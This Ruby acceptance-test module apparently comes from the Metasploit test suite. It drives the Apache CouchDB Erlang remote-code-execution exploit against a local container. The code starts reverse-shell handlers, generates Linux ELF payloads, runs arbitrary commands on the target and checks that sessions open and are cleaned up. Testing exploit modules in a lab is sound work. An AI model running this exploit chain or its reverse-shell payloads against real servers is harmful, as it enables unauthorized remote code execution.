# frozen_string_literal: true

require_relative '../couchdb_erlang/native_probe'
require 'digest'

# Expose the real vendor-operation receipt for the session evidence bundle.
class NativeCouchdbErlangSessionsProbe < NativeCouchdbErlangProbe
  attr_reader :records
end

module Acceptance
  # Stock handlers gate actual owner sessions and public shutdown/PID proofs.
  module CouchdbErlangSessions
    OWNER = 'exploit/multi/http/apache_couchdb_erlang_rce'

    def cs_json(expression)
      output = console_command("irb -e #{("puts 'CDB_JSON=' + (#{expression}).to_json").inspect}", timeout: 120)
      rows = output.lines.grep(/^CDB_JSON=/)
      expect(rows.length).to eq(1), output
      JSON.parse(rows.first.delete_prefix('CDB_JSON='))
    end

    def cs_save
      return unless @cs

      @cs[:native] = @native.records
      File.write(File.join(target_runtime.fetch('artifacts'), 'couchdb-sessions.json'), JSON.pretty_generate(@cs))
    end

    def cs_boot
      @native = NativeCouchdbErlangSessionsProbe.new
      @native.run
      @cs = { sessions: [], native_payloads: [], source: {}, commands: [] }
      @cs[:wget] = target_exec('target', 'dpkg-query', '-W', '-f', '${Package} ${Version}\n', 'wget')
      @cs[:baseline_tmp] = cs_tmp
      @cs[:observer] = cs_json("begin;require 'base64';require 'digest';require 'msf/util/exe';load 'test/module_targets/laravel/session_control.rb';load 'test/module_targets/druid_sessions/session_control.rb';load 'test/module_targets/rocketmq_sessions/session_control.rb';DruidSessionControl.install(framework);end")
      path = '/tmp/module-target-couchdb-wget'
      begin
        @native.rpc("wget -q -O #{path} http://127.0.0.1:5984/")
        expect(JSON.parse(target_exec('target', 'cat', path)).fetch('version')).to eq('3.2.1')
        expect(target_exec('target', 'stat', '-c', '%u', path).strip).to eq('5984')
      ensure
        target_exec('target', 'rm', '-f', path)
      end
      cs_save
    end

    def cs_tmp
      target_exec('target', 'find', '/tmp', '-mindepth', '1', '-maxdepth', '1', '-printf', '%f\n').lines.map(&:strip).sort
    end

    def cs_use(payload, owner, label)
      row = { payload: payload, owner: owner, label: label }
      @cs[:sessions] << row
      wait_for_expect(100, 0.1) do
        ready = File.readlines(@cs.fetch(:observer).fetch('ready_event_path')).map { |line| JSON.parse(line).fetch('id') }
        row[:session] = cs_json('framework.sessions.map{|id,s|{id:id,type:s.type,owner:s.via_exploit,payload:s.via_payload}}').find do |session|
          ready.include?(session.fetch('id')) && session.values_at('owner', 'payload') == [owner, 'payload/' + payload]
        end
        expect(row[:session]).not_to be_nil
      end
      identifier = row.fetch(:session).fetch('id')
      path = "/tmp/module-target-couchdb-session-#{Process.pid}-#{identifier}"
      marker = 'couchdb-session-proof'
      target_exec('target', 'test', '!', '-e', path)
      row[:proof] = cs_json("LaravelSessionControl.proof(framework,#{identifier},#{path.inspect},#{marker.inspect},false,component:'couchdb')")
      pid = row.fetch(:proof).fetch('pid')
      row[:process_stat] = target_exec('target', 'cat', "/proc/#{pid}/stat")
      row[:birth] = row.fetch(:process_stat).rpartition(') ').last.split.fetch(19)
      row[:physical_uid] = target_exec('target', 'stat', '-c', '%u', "/proc/#{pid}").strip
      expect(row.fetch(:physical_uid)).to eq('5984')
      expect(target_exec('target', 'stat', '-c', '%u', path).strip).to eq('5984')
      expect(target_exec('target', 'cat', path)).to eq(marker)
      row[:shutdown] = cs_json("LaravelSessionControl.shutdown(framework,#{identifier},component:'couchdb')")
      if row.fetch(:session).fetch('type') == 'meterpreter'
        expect(row.fetch(:shutdown).fetch('fresh_response')).to eq(pid)
      else
        expect(row.fetch(:shutdown).fetch('fresh_response')).to include('couchdb-live')
      end
      wait_for_expect(100, 0.1) { expect(target_exec('target', 'sh', '-c', 'if test -e "$1"; then printf PRESENT; fi', 'pid', "/proc/#{pid}")).to eq('') }
      cs_json("framework.sessions[#{identifier}]&.kill;true")
      expect(cs_json('framework.sessions.keys')).not_to include(identifier)
      target_exec('target', 'rm', path)
      console_command('jobs -K')
      row[:used_and_closed] = true
    ensure
      target_exec('target', 'rm', '-f', path) if path
      cs_save
    end

    def cs_native(payload)
      console_command('back')
      console_command('use exploit/multi/handler')
      { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444, 'ExitOnSession' => false, 'ReverseListenerBindAddress' => '0.0.0.0' }.each { |name, value| console_command("set #{name} #{value}") }
      expect(console_command('run -j -z')).not_to match(/Exploit failed|Exploit aborted/)
      expression = "begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;value=RocketmqSessionControl.command(job,#{payload.inspect});"
      if payload.start_with?('linux/')
        architecture = payload.split('/').fetch(1)
        artifact = File.join(target_runtime.fetch('artifacts'), "native-#{architecture}.elf")
        expression += "bytes=Msf::Util::EXE.to_linux_#{architecture}_elf(framework,Base64.strict_decode64(value.fetch(:command_base64)));File.binwrite(#{artifact.inspect},bytes);value.except(:command_base64).merge(executable_sha256:Digest::SHA256.hexdigest(bytes),executable_size:bytes.bytesize);end"
        generated = cs_json(expression)
        path = "/tmp/module-target-couchdb-native-#{architecture}.elf"
        output, status = Open3.capture2e(*target_runtime.fetch('compose'), 'cp', artifact, 'target:' + path)
        expect(status.success?).to be(true), output
        target_exec('target', 'chown', 'couchdb:couchdb', path)
        expect(target_exec('target', 'sha256sum', path).split.first).to eq(generated.fetch('executable_sha256'))
        @native.rpc("chmod 700 #{path}")
        command = path
      else
        generated = cs_json(expression + 'value;end')
        command = Base64.strict_decode64(generated.fetch('command_base64'))
      end
      @cs[:native_payloads] << { payload: payload, generated: generated }
      @native.rpc("(#{command}) >/dev/null 2>&1 &")
      cs_use(payload, 'exploit/multi/handler', 'native')
    ensure
      target_exec('target', 'rm', '-f', path) if path
      console_command('sessions -K')
      console_command('jobs -K')
      cs_save
    end

    def cs_owner(payload, target, record_selection: false)
      cs_native(payload)
      2.times do |index|
        console_command('back')
        console_command('use ' + OWNER)
        console_command("set TARGET #{target}")
        if record_selection
          @cs[:automatic_selection] = cs_json("{payload:active_module.datastore['PAYLOAD'],source:active_module.method(:connect_to_erlang_server).source_location}")
          @cs[:php_prerequisite] = target_exec('target', 'sh', '-c', 'if command -v php; then :; else printf ABSENT; fi')
        end
        options = { 'PAYLOAD' => payload, 'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 3 }
        output = run_target_module(OWNER, 'target', options, action: 'run -z', reuse_module: true, command_timeout: 120)
        expect(output).to match(/(?:Command shell|Meterpreter) session \d+ opened/)
        cs_use(payload, OWNER, 'owner-' + index.to_s)
        wait_for_expect(100, 0.1) { expect(cs_tmp).to eq(@cs.fetch(:baseline_tmp)) }
      end
    ensure
      console_command('sessions -K')
      console_command('jobs -K')
      cs_save
    end

    def cs_command(value, auto_check: true)
      path = '/tmp/module-target-couchdb-command'
      command = "printf %s #{Shellwords.escape(value)} > #{path}"
      begin
        @native.rpc(command)
        expect(target_exec('target', 'cat', path).b).to eq(value.b)
        target_exec('target', 'rm', path)
        2.times do
          console_command('back')
          console_command('use ' + OWNER)
          console_command('set TARGET 0')
          console_command('set PAYLOAD cmd/unix/generic')
          encoded = Base64.strict_encode64(command.b)
          binding = cs_json("begin;active_module.datastore['CMD']=Base64.strict_decode64(#{encoded.inspect}).force_encoding(Encoding::UTF_8);{input:Base64.strict_encode64(active_module.datastore['CMD']),source:active_module.method(:compile_cmd).source_location};end")
          expect(binding.fetch('input')).to eq(encoded)
          @cs[:commands] << binding.merge(value: Base64.strict_encode64(value.b), auto_check: auto_check)
          run_target_module(OWNER, 'target', { 'AutoCheck' => auto_check, 'WfsDelay' => 0, 'DisablePayloadHandler' => true }, reuse_module: true)
          wait_for_expect(100, 0.1) { expect(target_exec('target', 'sh', '-c', "if test -f #{path}; then stat -c %u #{path}; fi").strip).to eq('5984') }
          expect(target_exec('target', 'cat', path).b).to eq(value.b)
          target_exec('target', 'rm', path)
        end
      ensure
        target_exec('target', 'rm', '-f', path)
        cs_save
      end
    end

    def cs_finish
      expect(cs_tmp).to eq(@cs.fetch(:baseline_tmp))
      expect(cs_json('framework.sessions.keys')).to eq([])
      expect(cs_json('framework.jobs.keys')).to eq([])
      expect(JSON.parse(target_exec('target', 'curl', '--fail', '--silent', 'http://127.0.0.1:5984/')).fetch('version')).to eq('3.2.1')
      @cs[:final_preserved] = true
    ensure
      cs_save
    end
  end
end
